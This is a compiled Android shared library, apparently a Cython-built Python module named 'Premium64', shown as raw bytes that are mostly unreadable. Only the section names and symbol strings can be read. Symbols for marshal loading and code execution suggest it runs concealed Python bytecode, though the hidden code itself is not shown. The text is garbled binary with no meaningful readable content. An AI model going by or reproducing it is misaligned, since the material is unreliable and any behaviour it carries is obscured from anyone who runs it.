+��	�tJ@J�K
+�J	�tJ@J�K
+�J	�tJ�J�	�wJ��{J�J
+J�s���0��
+�&K(=$K"K$K�pJ��*J"K	�tJ�K�{��
+�2
+���2�J�JQ	zJJK�rJ	�
+JR���rJ	�
+JK	J�	�Q#�(
+��QJ(JJK	��uJ�
+�m�JJ�q��J�
+��q�'�J	KL�L=KPu<�	J�qJ�J
+8	I
+�	��qJ�J�<
+?��rJ
+�
+�	KL�nJ���nJ��PLHL
+�	fJ-J	eJ�|�	KJK�r��JP�n�	�����K��K��{<�J�nt���t
+$�oJ���J�	J�		�<%K9J
+��o��J	�J�pJ	�J�o��J
+�JPN
+J�o�
+�<J�
+J�
+��oJ��IK�o��J
+J�oJ
+�JJK�o<	���{��<�ot
+�J�oJ
+�JJM�o<	��@J�K�{��J�o����o<��
+�H
+�H!�r4
+�HF�rK8tP@tU�Z�5_p�rpw��|������
+�H
+�H
+�H3
+�HT�r����
+�H�0�h�
+I(�Ȉ
+0Lp
+3�r�D
+�Z�X
+h[\f
+�\t
+ Zx�
+�Y��
+(�Ј�0��؈ ���0�
+��
+���r�
+
+�)��:
+�4I
+�4W
+�4	d
+5t
+5	�
+5	�����Z
+��������� ��(�0�8�@�4H�CP�RX�d`��h��p��x���������!��L��w���������5���5��58
+Ht�&BaЈm��rЈy
+�H�������/DSh�������	3N_mЈ�������
+.>MZix�������			0	@	M	c	y	�	�	�	�	�	�	�	�	
+(
+.note.android.ident.dynsym.gnu.version.gnu.version_r.gnu.hash.hash.dynstr.rela.dyn.rela.plt.rodata.eh_frame_hdr.eh_frame.text.plt.data.rel.ro.fini_array.dynamic.got.got.plt.data.bss.comment.debug_loc.debug_abbrev.debug_info.debug_ranges.debug_str.debug_line.symtab.shstrtab.strtabcrtbegin_so.c__on_dlclose$x.1__dso_handle_const__on_dlclose_late$d.2$d.3$d.4$d.5$d.6note_android_ident$d.0note_datanote_namenote_endndk_versionndk_build_numberPremium64.c$x.0__pyx_moduledef__pyx_pymod_create__Pyx_check_single_interpreter.main_interpreter_id__pyx_pymod_exec_Premium64__pyx_string_tab__Pyx_PyObject_Call__Pyx_Globals__Pyx_PyExec3__Pyx__GetModuleGlobalName__Pyx_GetBuiltinName$d.1$d.2$d.3__pyx_methods__pyx_moduledef_slots$d.4$d.5$d.6__pyx_k_cline_in_traceback__pyx_k_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d__pyx_n_s_import__pyx_k_import__pyx_k_loads__pyx_k_main__pyx_k_marshal__pyx_k_name__pyx_k_test$d.7$d.8$d.9$d.10$d.11__pyx_code_cache.0__pyx_code_cache.1__pyx_m__pyx_empty_tuple__pyx_empty_bytes__pyx_empty_unicode__pyx_d__pyx_b__pyx_cython_runtime__pyx_n_s_name__pyx_n_s_main__pyx_n_s_marshal__pyx_pymod_exec_Premium64.__pyx_dict_version__pyx_pymod_exec_Premium64.__pyx_dict_cached_value__pyx_n_s_loads__pyx_tuple___pyx_n_s_test__pyx_n_s_builtins__pyx_n_s_cline_in_traceback__pyx_kp_b_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d__Pyx_CLineForTraceback.__pyx_dict_version__Pyx_CLineForTraceback.__pyx_dict_cached_value__pyx_code_cache.2$d.12$d.13$d.14__FRAME_END__$d.1__cxa_finalize__emutls_unregister_key__atexit_handler_wrapperatexit__cxa_atexitpthread_atfork__register_atfork__dso_handle__bss_start_end_edataPyInit_Premium64PyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_Premium64PyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObjectPyErr_Fetch_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyErr_RestorePyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCode_DYNAMICpp����o
+
+�*���o�
+�
+ 9���o�
+�
+0C�
+�
+`IX
+X
+�Q((x[B���e2((�m$5$5|{�5�5���H�84��^�N���r�R��8t8T�HtHT���u�UX�@v@V��0�0X��Ј�X��0�X���Y�*�e���<�=�J� 0j�o�*��V&�	80�
+A
+
